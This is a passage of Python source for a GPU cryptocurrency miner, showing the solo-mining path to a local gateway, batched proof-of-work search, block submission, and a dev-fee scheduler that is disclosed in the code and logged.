            proof_q.join()
            if status != "SWITCH":
                log("no job (timeout); reconnecting")
        except (ConnectionError, OSError, socket.timeout) as e:
            log(f"connection issue: {e}; reconnecting in 5s")
            time.sleep(5)
        except KeyboardInterrupt:
            log("stopping"); return


def run_solo(args, log):
    """Standalone mode against a local gateway over its JSON-RPC protocol
    (getMiningInfo / submitPlainProof). Same GPU pipeline and proof construction as
    the pool path -- only the wire protocol differs. The gateway assembles and
    submits the full block, so block rewards go to the node's configured address.

    A 2% dev fee applies here too, the same transparent way as the pool path: for 2%
    of cumulative mining time the GPU mines to the dev's pool wallet instead of your
    node, logged on every switch. Single-GPU.

    NOTE: untested end-to-end -- needs a running, synced Pearl node + pearl-gateway.
    """
    cfg = real_config()
    bufs = Bufs(args.region)
    sched = DevFeeScheduler(DEV_FEE, "your-node", DEV_ADDRESS, log)
    accepted = {"user": 0, "dev": 0}
    # Background proof builder/submitter, used only during dev-fee (pool) rounds.
    proof_q: queue.Queue = queue.Queue(maxsize=3)
    threading.Thread(target=_proof_worker, args=(proof_q, accepted, log),
                     daemon=True).start()

    log(f"SOLO mode | gateway {args.solo} | single-GPU")
    if sched.fee > 0:
        log(f"dev fee: {sched.fee * 100:.1f}% of mining time -- during a dev round the "
            f"GPU mines to the dev's pool wallet instead of your node (transparent; "
            f"logged on every switch). Thank you!")
    _resolve_pool(args, log)  # dev-round pool by GPU class when --pool not given
    dh, dp = args.pool.rsplit(":", 1)
    try:
        while True:
            if sched.mode == "dev":
                _solo_dev_round(dh, int(dp), sched.wallet, args.worker + "-solo", cfg,
                                bufs, sched, accepted, proof_q, args.region,
                                args.max_regions, log, args.verify)
            else:
                _solo_gateway_round(args, cfg, bufs, sched, log)
    except KeyboardInterrupt:
        log("solo: stopping")
        return


def _solo_dev_round(host, port, wallet, worker, cfg, bufs, sched, accepted, proof_q,
                    region, max_regions, log, verify):
    """Dev-fee round of solo mining: mine the upstream coordinator with the dev wallet until the
    scheduler switches back to your node. Reuses the exact pool mining loop."""
    while sched.mode == "dev":
        try:
            pool = UpstreamSync(host, port, wallet, worker)
            pool.connect()
            log(f"solo: DEV FEE round -- mining dev pool wallet "
                f"(realized {sched.realized_pct():.2f}%)")
            job = pool.next_job()
            while job is not None:
                header, target_int, job_id = job
                status, val = mine_job(pool, cfg, header, target_int, job_id, region,
                                       max_regions, sched, bufs, accepted, proof_q, log,
                                       verify=verify)
                if status == "NEWJOB":
                    job = val
                    continue
                if status == "SWITCH":
                    proof_q.join()
                    return
                job = None
            proof_q.join()
        except (ConnectionError, OSError, socket.timeout) as e:
            # Don't strand the user if the dev pool is unreachable: charge the outage
            # to the dev's owed time so the scheduler returns to your node.
            log(f"solo: dev-pool connection issue: {e}; retrying in 5s")
            sched.note(5.0)
            time.sleep(5)
            if sched.maybe_switch():
                return


def _solo_gateway_round(args, cfg, bufs, sched, log):
    """Mine the local gateway (rewards -> your node) until the dev-fee scheduler
    switches to a dev round (or forever, if the fee is 0)."""
    from gateway_client import MiningClient  # stdlib-only JSON-RPC client

    host, port = args.solo.rsplit(":", 1)
    port = int(port)
    factor = cfg.hash_tile_h * cfg.hash_tile_w * cfg.rounded_common_dim
    RS = args.region
    tiles_per_region = (RS // 16) ** 2
    found = np.empty(FOUND_BATCH, np.int32)
    coord = np.empty(2 * FOUND_BATCH, np.int32)
    submitted = 0
    while True:
        try:
            client = MiningClient(host, port)
            log(f"solo: connected to gateway {args.solo}")
            cur_header = None
            key = None
            grid = 0
            t_acct = time.time()      # wall time not yet charged to the dev scheduler
            while True:
                # Pull the current template; re-key only when the header changes.
                job = client.get_mining_info()
                header = job.incomplete_header_bytes
                target_int = job.target
                if header != cur_header:
                    cur_header = header
                    key = commitment.derive_key(header, cfg)
                    penalized = pm.penalized_target_bound(target_int, cfg)
                    if penalized is None:
                        log("solo: target too easy for penalized bound -- skipping template")
                        continue
                    bound = min(penalized, (1 << 256) - 1)
                    bufs.dtgt.from_host(
                        np.frombuffer(int(bound).to_bytes(32, "little"), np.uint8).copy())
                    log(f"solo: new template target=2^{target_int.bit_length()-1} "
                        f"bound=2^{bound.bit_length()-1}")

                grid += 1
                # ---- fresh random grid (new commitment) for this template ----
                bufs.dkeyjob.from_host(np.frombuffer(key, np.uint8).copy())
                cc.setup_job(bufs.dA, bufs.dB, bufs.dBt_full, bufs.dkeyjob, bufs.dnsA,
                             bufs.dnsB, M, N, K, R, time.time_ns() & 0xFFFFFFFFFFFFFFFF)
                cc.noise_gen(bufs.dEAL, bufs.dEAR, bufs.dEBL, bufs.dEBR,
                             bufs.dnsA, bufs.dnsB, M, N, K, R)
                cc.transpose_i8(bufs.dEAR, bufs.dEAR_t, R, K, K, 0)
                cc.sync()

                searched = 0
                search_t0 = time.time()
                last_print = search_t0
                computed: set[int] = set()

                def bt_noised(c0):
                    idx = c0 // RS
                    d = bufs.dBpEB[idx]
                    if idx not in computed:
                        # Z = base B^T slice from dBt_full (setup_job) -- no re-transpose.
                        cc.noise_gemm(bufs.dEBR.offset(c0 * R), bufs.dEBL,
                                      bufs.dBt_full.offset(c0 * K), d, RS, K, R)
                        computed.add(idx)
                    return d

                def submit_block(gr, gc):
                    nonlocal submitted
                    log(f"  solo: BLOCK CANDIDATE (row={gr}, col={gc})! building proof...")
                    A = np.empty((M, K), np.int8); bufs.dA.to_host(A)
                    Bt = np.empty((N, K), np.int8); bufs.dBt_full.to_host(Bt)
                    proof = commitment.build_proof_bt(A, Bt, gr, gc, key, R)
                    try:
                        client.submit_plain_proof(proof, job)
                        submitted += 1
                        log(f"  solo: *** SUBMITTED BLOCK PROOF to gateway *** (total {submitted})")
                    except Exception as e:
                        log(f"  solo: submit error: {e}")

                # Regions stream back-to-back; sync + found-scan only once per FOUND_BATCH
                # so the GPU isn't gated by a host round-trip every region (~28 vs ~20 TH/s).
                batch: list[tuple[int, int]] = []
                bufs.dfound.memset(0)

                def flush_solo():
                    # Sync once; return (gr, gc) of the first hit in the batch, or None.
                    if not batch:
                        return None
                    cc.sync()
                    bufs.dfound.to_host(found)
                    res = None
                    if found[:len(batch)].any():
                        bufs.dcoord.to_host(coord)
                        for i, (br0, bc0) in enumerate(batch):
                            if int(found[i]) == 1:
                                res = (br0 + int(coord[2 * i]), bc0 + int(coord[2 * i + 1]))
                                break
                    bufs.dfound.memset(0)
                    batch.clear()
                    return res

                hit = False
                for r0 in range(0, M, RS):
                    cc.noise_gemm(bufs.dEAL.offset(r0 * R), bufs.dEAR_t,
                                  bufs.dA.offset(r0 * K), bufs.dApEA, RS, K, R)
                    for c0 in range(0, N, RS):
                        searched += 1
                        slot = len(batch)
                        dBpEB = bt_noised(c0)
                        cc.pearl_pow_split(bufs.dApEA, dBpEB, RS, RS, K, R, bufs.dnsA,
                                           bufs.dtgt, bufs.dtb, None,
                                           bufs.dfound.offset(slot * 4),
                                           bufs.dcoord.offset(slot * 8), VARIANT)
                        batch.append((r0, c0))
                        if len(batch) >= FOUND_BATCH:
                            res = flush_solo()
                            if time.time() - last_print >= 5:
                                ths = searched * tiles_per_region * 1048576.0 / max(time.time() - search_t0, 1e-9) / 1e12
                                log(f"  solo grid {grid}: {searched} regions ({ths:.2f} TH/s)")
                                last_print = time.time()
                            if res is not None:
                                submit_block(*res)
                                hit = True
                                break
                    if hit:
                        break
                    # charge elapsed time per row-block; hand over if a dev round is due
                    now = time.time()
                    sched.note(now - t_acct)
                    t_acct = now
                    if sched.maybe_switch():
                        res = flush_solo()
                        if res is not None:
                            submit_block(*res)
                        return
                if not hit:
                    res = flush_solo()   # drain any partial last batch
                    if res is not None:
                        submit_block(*res)
                        hit = True
                if not hit:
                    ths = searched * tiles_per_region * 1048576.0 / max(time.time() - search_t0, 1e-9) / 1e12
                    log(f"  solo grid {grid} swept ({ths:.2f} TH/s); no candidate")
                now = time.time()
                sched.note(now - t_acct)
                t_acct = now
                if sched.maybe_switch():
                    return
        except (ConnectionError, OSError, socket.timeout) as e:
            log(f"solo: gateway connection issue: {e}; retrying in 5s")
            time.sleep(5)


if __name__ == "__main__":
    main()
